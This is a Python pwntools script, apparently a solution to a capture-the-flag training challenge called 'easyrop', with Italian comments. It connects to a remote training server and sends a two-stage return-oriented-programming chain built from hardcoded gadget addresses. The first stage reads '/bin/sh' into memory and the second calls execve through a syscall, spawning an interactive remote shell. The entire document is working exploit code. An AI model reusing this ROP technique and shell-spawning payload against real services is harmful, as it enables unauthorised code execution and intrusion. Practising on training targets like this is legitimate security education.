from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./easyrop")
p = remote("training.jinblack.it", 2015)
#gdb.attach(p, '''b *0x0400206b *0x0400230''') #entrambe le read
#gdb.attach(p, '''b *0x0400230''') #seconda read
#gdb.attach(p, '''b *0x0000000000400290''') #leave

raw_input("Wait")

#/bin/sh
binString = 0x68732f6e69622f
binString0_8 = 0x6e69622f
binString9_16 = 0x68732f

for x in range(0,14):
	p.send("\x90"*4)
	p.send("\x00"*4)

#pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
popAddr = 0x00000000004001c2
popAddr0_8 = 0x04001c2
popAddr9_16 = 0x0

#pop3
pop3Addr = 0x00000000004001c3
pop3Addr0_8 = 0x04001c3
pop3Addr9_16 = 0x0

#syscall
syscallAddr = 0x0000000000400168
syscallAddr0_8 = 0x0400168
syscallAddr10_8 = 0x0400161
syscallAddr9_16 = 0x0

#bufferAddress -> len + 0x10
bufferAddr = 0x00600398
bufferAddr0_8 = 0x0600398
bufferAddr9_16 = 0x0

zero = 0x006003a0
zero0_8 = 0x06003a0
zero9_16 = 0x0

#read1
readAddr = 0x00400144
readAddr0_8 = 0x00400144
readAddr9_16 = 0x0000000

cmd = "/bin/sh\x00"


def sendMemory(address0_8, address9_16):
	global p
	p.send(p32(address0_8)) #syscall 0-8
	p.send("\x00"*4)
	p.send(p32(address9_16)) #syscall 9-16
	p.send("\x00"*4)

#pop4
#rdi <- stdin 0
#rsi <- buffer addr
#rdx <- len(cmd)
#rax <- qualcosa a caso
#read
#pop4
#rdi <- ADDRESS of /bin/sh == bufAddress
#rsi <- 0x0 <- puntatore a zero, non zero
#rdx <- 0x0 <- puntatore a zero, non zero
#rax <- 0x3b
#syscall

sendMemory(popAddr0_8, popAddr9_16)
sendMemory(0x0, 0x0)
sendMemory(bufferAddr0_8, bufferAddr9_16)
sendMemory(len(cmd), 0)
sendMemory(len(cmd), 0)
sendMemory(readAddr0_8, readAddr9_16)

sendMemory(popAddr0_8, popAddr9_16)
sendMemory(bufferAddr0_8, bufferAddr9_16)
sendMemory(zero0_8, zero9_16)
sendMemory(zero0_8, zero9_16)
sendMemory(0x3b, 0)
sendMemory(syscallAddr0_8, syscallAddr9_16)

time.sleep(1)
p.send("\x00") #Uscita
time.sleep(1)
p.send("\x00")
time.sleep(1)

p.send(cmd)

p.interactive()